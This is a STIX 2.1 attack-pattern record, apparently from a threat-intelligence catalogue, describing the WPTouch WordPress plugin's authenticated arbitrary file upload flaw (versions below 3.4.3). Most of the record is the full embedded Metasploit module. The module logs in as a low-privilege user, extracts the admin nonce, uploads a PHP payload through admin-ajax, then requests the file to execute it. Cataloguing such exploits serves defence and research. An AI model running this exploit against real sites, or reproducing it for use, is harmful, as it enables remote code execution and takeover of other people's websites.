{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--23f7fac7-9327-4bef-a158-a7de2b49122c",
    "created": "2024-08-14T17:13:37.395572Z",
    "modified": "2024-08-14T17:13:37.395576Z",
    "name": "WordPress WPTouch Authenticated File Upload",
    "description": " The WordPress WPTouch plugin contains an authenticated file upload vulnerability. A wp-nonce (CSRF token) is created on the backend index page and the same token is used on handling ajax file uploads through the plugin. By sending the captured nonce with the upload, we can upload arbitrary files to the upload folder. Because the plugin also uses its own file upload mechanism instead of the WordPress api it's possible to upload any file type. The user provided does not need special rights, and users with \"Contributor\" role can be abused. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/wp_wptouch_file_upload.rb",
            "external_id": "wp_wptouch_file_upload.rb"
        },
        {
            "source_name": "reference",
            "url": "http://blog.sucuri.net/2014/07/disclosure-insecure-nonce-generation-in-wptouch.html"
        },
        {
            "source_name": "WPVDB",
            "external_id": "7118"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HTTP::Wordpress\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(\n      info,\n      'Name'           => 'WordPress WPTouch Authenticated File Upload',\n      'Description'    => %q{\n          The WordPress WPTouch plugin contains an authenticated file upload\n          vulnerability. A wp-nonce (CSRF token) is created on the backend index\n          page and the same token is used on handling ajax file uploads through\n          the plugin. By sending the captured nonce with the upload, we can\n          upload arbitrary files to the upload folder. Because the plugin also\n          uses its own file upload mechanism instead of the WordPress api it's\n          possible to upload any file type.\n          The user provided does not need special rights, and users with \"Contributor\"\n          role can be abused.\n      },\n      'Author'         =>\n        [\n          'Marc-Alexandre Montpas', # initial discovery\n          'Christian Mehlmauer'     # metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['URL', 'http://blog.sucuri.net/2014/07/disclosure-insecure-nonce-generation-in-wptouch.html'],\n          ['WPVDB', '7118']\n        ],\n      'Privileged'     => false,\n      'Platform'       => ['php'],\n      'Arch'           => ARCH_PHP,\n      'Targets'        => [['wptouch < 3.4.3', {}]],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2014-07-14'))\n\n    register_options(\n      [\n        OptString.new('USER', [true, 'A valid username', nil]),\n        OptString.new('PASSWORD', [true, 'Valid password for the provided username', nil])\n      ])\n  end\n\n  def user\n    datastore['USER']\n  end\n\n  def password\n    datastore['PASSWORD']\n  end\n\n  def check\n    check_plugin_version_from_readme('wptouch', '3.4.3')\n  end\n\n  def get_nonce(cookie)\n    res = send_request_cgi(\n      'uri'    => wordpress_url_backend,\n      'method' => 'GET',\n      'cookie' => cookie\n    )\n\n    # forward to profile.php or other page?\n    if res && res.redirect? && res.redirection\n      location = res.redirection\n      print_status(\"Following redirect to #{location}\")\n      res = send_request_cgi(\n        'uri'    => location,\n        'method' => 'GET',\n        'cookie' => cookie\n      )\n    end\n\n    if res && res.body && res.body =~ /var WPtouchCustom = {[^}]+\"admin_nonce\":\"([a-z0-9]+)\"};/\n      return Regexp.last_match[1]\n    else\n      return nil\n    end\n  end\n\n  def upload_file(cookie, nonce)\n    filename = \"#{rand_text_alpha(10)}.php\"\n\n    data = Rex::MIME::Message.new\n    data.add_part(payload.encoded, 'application/x-php', nil, \"form-data; name=\\\"myfile\\\"; filename=\\\"#{filename}\\\"\")\n    data.add_part('homescreen_image', nil, nil, 'form-data; name=\"file_type\"')\n    data.add_part('upload_file', nil, nil, 'form-data; name=\"action\"')\n    data.add_part('wptouch__foundation__logo_image', nil, nil, 'form-data; name=\"setting_name\"')\n    data.add_part(nonce, nil, nil, 'form-data; name=\"wp_nonce\"')\n    post_data = data.to_s\n\n    print_status(\"Uploading payload\")\n    res = send_request_cgi(\n      'method'   => 'POST',\n      'uri'      => wordpress_url_admin_ajax,\n      'ctype'    => \"multipart/form-data; boundary=#{data.bound}\",\n      'data'     => post_data,\n      'cookie'   => cookie\n    )\n\n    if res && res.code == 200 && res.body && res.body.length > 0\n      register_files_for_cleanup(filename)\n      return res.body\n    end\n\n    nil\n  end\n\n  def exploit\n    print_status(\"Trying to login as #{user}\")\n    cookie = wordpress_login(user, password)\n    if cookie.nil?\n      print_error(\"Unable to login as #{user}\")\n      return\n    end\n    store_valid_credential(user: user, private: password, proof: cookie)\n\n    print_status(\"Trying to get nonce\")\n    nonce = get_nonce(cookie)\n    if nonce.nil?\n      print_error(\"Can not get nonce after login\")\n      return\n    end\n    print_status(\"Got nonce #{nonce}\")\n\n    print_status(\"Trying to upload payload\")\n    file_path = upload_file(cookie, nonce)\n    if file_path.nil?\n      print_error(\"Error uploading file\")\n      return\n    end\n\n    print_status(\"Calling uploaded file #{file_path}\")\n    send_request_cgi(\n      'uri'    => file_path,\n      'method' => 'GET'\n    )\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-07-14",
    "x_mitre_platforms": [
        "['php']"
    ]
}